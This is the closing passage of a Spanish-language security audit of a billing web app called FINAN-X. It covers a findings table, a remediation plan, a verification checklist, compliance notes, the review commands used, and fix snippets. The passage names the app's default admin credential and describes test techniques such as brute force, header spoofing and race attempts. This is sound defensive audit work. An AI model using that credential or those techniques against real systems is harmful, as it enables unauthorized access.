| M-06 | Media | Desactivar cliente no revoca su sesión | 613 | A01/A07 | `clientes.js:115-125`, `auth.js:22-67` |
| M-07 | Media | Auditoría sin IP/UA, inmutable ni retención | 778/117 | A09 | `audit.js:19-41`, `init.sql:175` |
| M-08 | Media | App conectada como superusuario, sin RLS | 250 | A01/A05 | `docker-compose.yml:5-8`, `db.js` |
| M-09 | Media | SPA sin cabeceras de seguridad | 693/1021 | A05 | `nginx.conf` |
| M-10 | Media | Inyección en `mailto:` (correo sin validar) | 93/74 | A03 | `FacturaDetalle.jsx:120` y otros |
| M-11 | Media | Validación incompleta → 500 y entradas no numéricas | 20/1284 | A04 | `facturas.js:48`, `notas-credito.js:62`, `pedidos.js:87` |
| M-12 | Media | Dependencias con CVE (3 altas backend / 2 frontend) | 1104 | A06 | `package-lock.json` |
| M-13 | Media | Sin límite global, sin tamaño, sin paginación | 770 | A04/A05 | `index.js:36`, rutas `LIMIT 300` |
| M-14 | Media | Sin respaldos ni plan de recuperación | 693 | A04 | `docker-compose.yml:11-13` |
| B-01 | Baja | `/health` y 404 con información | 200 | A05 | `index.js:38,52` |
| B-02 | Baja | JWT sin `algorithms`/`iss`/`aud`; 8 h fijas | 347 | A02/A07 | `middleware/auth.js:29` |
| B-03 | Baja | Código Efecty determinístico | 330 | A04 | `mis.js:122-127` |
| B-04 | Baja | Sin verificación de contacto; enums sin lista blanca | 20 | A04 | `auth.js:105`, `clientes.js:58` |
| B-05 | Baja | Logs con error completo y con OTP | 532 | A09 | `index.js:59`, `notificar.js:17` |
| B-06 | Baja | Imágenes por tag mutable; sin escaneo/SAST | 1104 | A06 | `Dockerfile`, CI |
| B-07 | Baja | Sin `Cache-Control: no-store` en PII | 525 | A05 | `index.js` |
| B-08 | Baja | Limitador en memoria (no multi-instancia) | 770 | A04 | `rateLimit.js:13` |
| B-09 | Baja | Numeración secuencial de facturas | 200 | A04 | `facturas.js:82` |

---

## 7. Plan de remediación priorizado

El orden no es por severidad "de papel", sino por **relación entre riesgo y esfuerzo** y por dependencias (no tiene sentido endurecer la sesión si cualquiera entra con `admin123`).

### Fase 0 — Contención inmediata (24-48 horas, ~6-8 h de trabajo)

| # | Acción | Hallazgos | Esfuerzo |
|---|---|---|---|
| 1 | Quitar `seed.js` del `CMD` del backend y borrar/rotar cuentas demo | C-01 | 1 h |
| 2 | Quitar `ports: 5432:5432` y cambiar `POSTGRES_PASSWORD` | C-02 | 30 min |
| 3 | Quitar `ports: 4000:4000`; publicar solo el frontend | C-03/A-02 | 30 min |
| 4 | Quitar el bloque de credenciales demo de `Login.jsx` | C-01 | 15 min |
| 5 | TLS + redirección 80→443 + HSTS | C-03 | 2 h |
| 6 | Forzar `otpDemo=false` en producción y quitar el código de los logs | M-01 | 30 min |
| 7 | `npm audit fix` y actualizar `express`, `axios`, `react-router` | M-12 | 2 h |

**Criterio de salida:** un escaneo externo no encuentra 5432 ni 4000 abiertos; el login con `admin@finanx.test/admin123` falla; `https://` funciona con certificado válido.

### Fase 1 — Correcciones de fondo (1-2 semanas, ~30-40 h)

| # | Acción | Hallazgos |
|---|---|---|
| 8 | Login: contadores por cuenta + por IP, sin reset global, con retroceso exponencial y CAPTCHA | A-01, M-04 |
| 9 | Cookies `HttpOnly`/`Secure`/`SameSite` + CSRF + CSP/HSTS/anti-clickjacking en nginx | A-03, M-09 |
| 10 | MFA TOTP para ADMIN/SUPERVISOR; mínimo 12 caracteres + HIBP; bcrypt 12 | A-06 |
| 11 | Separación de funciones en notas de crédito y anulación de facturas (maker-checker) | A-04 |
| 12 | `FOR UPDATE` + recálculo en notas de crédito + prueba de concurrencia | A-05 |
| 13 | Revocación real de sesión de cliente al desactivarlo (`requireAuth` + `token_version`) | M-06 |
| 14 | Restringir creación de cuentas de cliente a ADMIN con contraseña temporal | M-03 |
| 15 | Validación de entrada completa + mapeo de errores PG a 400/409 | M-11 |
| 16 | Enmascarar/cifrar datos de pago; limitar su exposición por API | M-05 |
| 17 | Rol de base de datos de mínimos privilegios (sin superusuario) | M-08 |

**Criterio de salida:** pruebas de fuerza bruta (script propio) no superan 5 intentos/min por cuenta; un token de cliente desactivado devuelve 401; dos notas de crédito concurrentes no superan lo pagado; el usuario de BD no es superusuario.

### Fase 2 — Madurez y operación (30-90 días)

| # | Acción | Hallazgos |
|---|---|---|
| 18 | Auditoría con IP/UA, *append-only*, retención y alertas | M-07 |
| 19 | Paginación real, límite global de peticiones y tamaño | M-13 |
| 20 | Respaldos cifrados + PITR + prueba de restauración | M-14 |
| 21 | Enumeración: tiempos constantes y mensajes uniformes | M-02 |
| 22 | Validación/verificación de correo + mitigación de `mailto:` | M-10, B-04 |
| 23 | CI de seguridad: `npm audit`, Semgrep/CodeQL, Trivy, ZAP en *staging* | B-06 |
| 24 | Endurecer JWT (`algorithms`, `iss`/`aud`, rotación) y logout servidor | B-02 |
| 25 | Documentar modelo de amenazas, *runbook* de incidentes y política de datos (Ley 1581) | Transversal |

### Esfuerzo total estimado

| Fase | Horas | Riesgo residual al terminar |
|---|---|---|
| 0 | 6-8 h | Alto (queda el riesgo de sesión y de fraude interno) |
| 1 | 30-40 h | Medio-bajo |
| 2 | 40-60 h | Bajo, con operación continua |

---

## 8. Checklist de verificación posterior (para el equipo)

Marcar cada punto tras corregir; cualquiera sin marcar deja un hallazgo abierto.

- [ ] `docker compose config` no muestra `5432` ni `4000` publicados.
- [ ] `psql` desde fuera del host falla por timeout/conexión rechazada.
- [ ] La contraseña `admin123` no existe en ningún entorno; el login demo devuelve 401.
- [ ] La pantalla de login no muestra usuarios ni contraseñas.
- [ ] `http://` redirige a `https://`; HSTS presente; certificado válido.
- [ ] Respuesta de `/api/*` con `Cache-Control: no-store`.
- [ ] La SPA responde con `Content-Security-Policy`, `X-Frame-Options: DENY`, `Referrer-Policy`.
- [ ] 10 intentos fallidos seguidos contra un usuario → bloqueo progresivo, aunque haya un login correcto con otra cuenta desde la misma IP.
- [ ] `X-Forwarded-For` falsificado no cambia la IP efectiva del limitador.
- [ ] Token de cliente desactivado → 401 en la siguiente petición.
- [ ] Dos `POST /api/notas-credito` simultáneos por el total pagado → la segunda falla.
- [ ] Un CAJERO recibe 403 al intentar crear/anular una nota de crédito.
- [ ] La API no devuelve `numero_cuenta` completo ni el vencimiento de la tarjeta.
- [ ] `otpDemo` es `false` con `NODE_ENV=production` (aunque `OTP_RETORNO_DEMO=on`).
- [ ] `npm audit --audit-level=high` sale limpio.
- [ ] El usuario de la aplicación no es superusuario (`SELECT rolsuper FROM pg_roles WHERE rolname = current_user;` → `f`).
- [ ] Existe un respaldo restaurado en un entorno limpio en los últimos 30 días.

---

## 9. Cumplimiento y buenas prácticas

| Marco | Aplicación en FINAN-X | Estado |
|---|---|---|
| **OWASP Top 10 (2021)** | A01 (M-03, A-04, M-06), A02 (C-03, M-05), A03 (M-10; sin SQLi/XSS explotable), A04 (A-04, A-05, M-13), A05 (C-01, C-02, M-08, M-09), A06 (M-12, B-06), A07 (A-01, A-06, M-01, M-02), A08 (integridad de dependencias), A09 (M-07, B-05) | Parcial |
| **OWASP ASVS 4.0.3** | V2 (autenticación), V3 (sesión), V4 (control de acceso), V5 (validación), V6 (criptografía), V7 (errores/logs), V9 (comunicaciones), V10 (código malicioso) | Nivel 1 incompleto (V2/V3/V9) |
| **PCI-DSS v4.0** | No se almacena PAN ni CVV (bien); pero datos de tarjeta/cuenta se devuelven y guardan sin cifrar (M-05), y no hay TLS (C-03) → requisitos 3 y 4 | No cumple |
| **Ley 1581 de 2012 (Colombia)** | Datos personales de clientes; faltan medidas de seguridad demostrables (cifrado, control de acceso, auditoría, retención) | Riesgo |
| **Ley 527 / facturación electrónica DIAN** | La app no emite factura electrónica validada por DIAN (fuera de alcance), pero la numeración y la inmutabilidad del registro son relevantes | A evaluar |
| **ISO/IEC 27001 (A.8, A.12, A.13, A.16)** | Respaldos (M-14), registro (M-07), seguridad de comunicaciones (C-03), gestión de incidentes (inexistente) | Brechas |

**Recomendación de política de datos:** definir base legal y finalidad del tratamiento, tiempo de retención (facturación suele exigir 5 años), procedimiento de acceso/rectificación/supresión, cifrado en tránsito y en reposo, y registro de accesos a datos personales (hoy no existe).

---

## 10. Conclusión

FINAN-X es un proyecto **técnicamente sólido en la lógica de negocio** y **débil en su puesta en producción**. El equipo demostró criterio al resolver problemas difíciles —saldo derivado de una vista, bloqueo pesimista en pagos, invalidación de sesiones con `token_version`, validación del secreto JWT al arrancar, auditoría transaccional, ausencia de PAN/CVV— y eso se nota: no hay SQL injection, no hay IDOR en el portal, no se puede manipular un precio. Es un punto de partida excelente.

Pero **lo que rodea a ese núcleo no está preparado**. La aplicación se entrega con un administrador de contraseña conocida, una base de datos abierta con credenciales por defecto y sin cifrado en tránsito. En términos prácticos, el esfuerzo invertido en la lógica se puede anular en un minuto desde cualquier navegador o desde `psql`. Para un sistema de facturación, eso no es un detalle de configuración: es la diferencia entre un proyecto que se puede desplegar y uno que no.

La buena noticia es que **las correcciones críticas son baratas** (horas, no semanas): quitar el seed del arranque, cerrar dos puertos, poner TLS y borrar un bloque de texto de la pantalla de login eliminan el escenario de compromiso total. Las correcciones de fondo (sesión, MFA, segregación de funciones, concurrencia, datos de pago) requieren más trabajo, pero están bien acotadas y el código actual ya muestra los patrones correctos en otros módulos: se trata de **aplicarlos de forma consistente**, no de reescribir.

**Veredicto:** no apto para producción en el estado actual; **apto para desplegar tras la Fase 0 y la Fase 1** del plan, con verificación del checklist. Para un trabajo universitario, el valor añadido es que el informe no se queda en "falta HTTPS": muestra cómo un atacante encadena configuración, credenciales y lógica para llegar al dato, y cómo cerrar cada eslabón.

---

## Anexo A — Comandos y evidencias de la revisión

Comandos de solo lectura ejecutados (extracto):

```powershell
# Inventario
Get-ChildItem -Force
Get-ChildItem -Recurse -File -Path backend,frontend,database

# ¿Está el .env versionado?
git ls-files | Select-String '\.env'
git log --all --name-only --pretty=format: | Sort-Object -Unique | Select-String '(^|/)\.env'
# → solo backend/.env.example

# Estado del árbol (antes de crear esta entrega)
git rev-parse --short HEAD        # ce398d5
git status --porcelain            # ?? documentacion/_trabajos/  (preexistente)

# Dependencias
npm audit --omit=dev --json       # backend: 3 high, 1 moderate
npm audit --omit=dev --json       # frontend: 2 high, 2 moderate

# Búsquedas dirigidas
grep -R "dangerouslySetInnerHTML|innerHTML|eval\(" frontend/src
grep -R "localStorage" frontend/src
grep -R "router\.(get|post|put|patch|delete)\(" backend/src/routes   # 52 rutas
grep -R "\$\{" backend/src                                           
# → 117 interpolaciones, todas estáticas
```

**Métricas de la revisión:** 52 rutas, 4 middleware, 25 páginas React, 324 líneas de esquema SQL, 2 lockfiles, 3 servicios Docker, 4 archivos de configuración de despliegue.

---

## Anexo B — Detalle de dependencias y avisos

| Proyecto | Paquete | Versión instalada | Aviso | Severidad | Corregido en |
|---|---|---|---|---|---|
| backend | `body-parser` | 1.20.8 | GHSA-27r3-jxmh-p828 | Alta (7.5) | ≥ 1.20.9 |
| backend | `qs` | 6.16.0 | GHSA-6pq8-jhm2-2vcw | Media (5.3) | versión parcheada |
| backend | `express` | 4.22.3 | transitivo (`body-parser`, `qs`) | Alta | 4.22.x+ / parche |
| backend | `express-rate-limit` | 7.5.1 | transitivo (`express`) | Alta | — |
| frontend | `follow-redirects` | 1.16.0 | GHSA-q3jh-wrc6-jgq8, GHSA-8r9p-f939-6h3c, GHSA-mrwp-f3q8-3g9p | Alta (5.9) | versión parcheada |
| frontend | `axios` | 1.20.0 | transitivo (`follow-redirects`) | Alta | — |
| frontend | `react-router` | 6.30.6 | GHSA-wrjc-x8rr-h8h6, GHSA-337j-9hxr-rhxg | Media (6.1) | versión parcheada |

> `npm audit` reportó `fixAvailable: false` en el lockfile actual; puede requerir actualización manual de la dependencia raíz y regeneración del lockfile. Verificar con `npm audit` tras el cambio.

---

## Anexo C — Fragmentos de referencia para las correcciones

**C-01:** quitar el seed del arranque.

```dockerfile
# backend/Dockerfile (final)
CMD ["node", "src/index.js"]
```

**A-01/A-02:** contador por cuenta y por IP, con confianza de proxy explícita.

```js
app.set('trust proxy', ['loopback', '172.16.0.0/12']);

// rateLimit.js — clave compuesta, sin reset global
const clave = `${req.ip}|${String(req.body?.username || '').toLowerCase()}`;
```

**A-05:** bloqueo de la factura antes de calcular la devolución.

```sql
SELECT f.factura_id, f.estado,
       COALESCE(pg.pagado, 0)::float8        AS pagado,
       COALESCE(nc.notas_previas, 0)::float8 AS notas_previas
FROM facturas f
LEFT JOIN (SELECT factura_id, SUM(valor) AS pagado FROM pagos GROUP BY factura_id) pg
       ON pg.factura_id = f.factura_id
LEFT JOIN (SELECT factura_id, SUM(valor) AS notas_previas
           FROM notas_credito WHERE estado = 'ACTIVA' GROUP BY factura_id) nc
       ON nc.factura_id = f.factura_id
WHERE f.factura_id = $1
FOR UPDATE OF f;
```

**M-06:** validar el estado del cliente en cada petición.

```js
// requireAuth, rama tipo === 'cliente'
const fila = await pool.query(
  `SELECT uc.token_version, uc.estado AS cuenta_estado, c.estado AS cliente_estado
     FROM usuario_cliente uc JOIN clientes c ON c.cliente_id = uc.cliente_id
    WHERE uc.usuario_cliente_id = $1`, [payload.usuarioClienteId]);
if (!fila.rowCount || fila.rows[0].cuenta_estado !== 'ACTIVO' || fila.rows[0].cliente_estado !== 'ACTIVO') {
  return res.status(401).json({ error: 'Sesión inválida o expirada' });
}
```

**M-01:** el modo demo no puede activarse en producción.

```js
otpDemo: !esProduccion && process.env.OTP_RETORNO_DEMO === 'on',
```

**M-10:** construir el `mailto` sin concatenar.

```js
const url = new URL(`mailto:${encodeURIComponent(correo)}`);
url.searchParams.set('subject', `Factura ${numero} · FINAN-X`);
url.searchParams.set('body', cuerpo);
```

---

*Fin del informe. Documento generado como parte de una auditoría de seguridad de solo lectura; no se modificó código de la aplicación auditada.*
